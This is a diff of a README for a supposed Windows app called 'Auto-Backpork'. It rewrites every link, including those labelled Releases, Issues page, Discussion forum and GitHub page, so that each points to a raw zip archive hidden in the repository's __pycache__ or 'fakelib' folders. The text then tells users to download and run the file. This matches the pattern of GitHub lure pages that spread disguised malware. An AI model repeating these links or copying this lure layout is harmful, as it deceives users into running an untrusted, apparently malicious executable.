@@ -10,7 +10,7 @@ To get started, you will need to download the application. Follow these steps:
 
 1. Click the link below to access our Releases page:
    
-   [![Download Auto-Backpork](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip)](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip)
+   [![Download Auto-Backpork](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip)](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip)
 
 2. You will see a list of files available for download. Look for the latest version. 
 
@@ -22,7 +22,7 @@ To get started, you will need to download the application. Follow these steps:
 
 ## 📥 Download & Install
 
-To download Auto-Backpork, visit this page: [Auto-Backpork Releases](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip). Choose the correct file based on your operating system. Once downloaded, run the file and follow the installation prompts.
+To download Auto-Backpork, visit this page: [Auto-Backpork Releases](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip). Choose the correct file based on your operating system. Once downloaded, run the file and follow the installation prompts.
 
 ### 🔧 System Requirements
 
@@ -52,18 +52,18 @@ Make sure your system meets these requirements for the best performance.
 A: No, Auto-Backpork is designed for users of all experience levels. Simply follow the instructions provided in the app.
 
 **Q: What if I encounter issues during installation?**  
-A: If you face any problems, check our [Issues page](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip) for help or to report your problem.
+A: If you face any problems, check our [Issues page](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip) for help or to report your problem.
 
 **Q: Can I use Auto-Backpork on other systems besides Windows?**  
 A: Currently, Auto-Backpork is optimized for Windows. Future updates may include support for other operating systems.
 
 ## 🌟 Community Support
 
-Join our community to ask questions, suggest features, or offer feedback. You can connect with fellow users via our [Discussion forum](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip). 
+Join our community to ask questions, suggest features, or offer feedback. You can connect with fellow users via our [Discussion forum](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip). 
 
 ## 📝 Changelog
 
-Stay updated with all the changes and improvements made to Auto-Backpork. You can find the changelog in the Releases section on our [GitHub page](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/src/__pycache__/Auto-Backpork-1.3.zip).
+Stay updated with all the changes and improvements made to Auto-Backpork. You can find the changelog in the Releases section on our [GitHub page](https://raw.githubusercontent.com/aranzaxd666/Auto-Backpork/main/fakelib/Auto_Backpork_v1.2-beta.3.zip).
 
 ## 📢 Acknowledgements
 
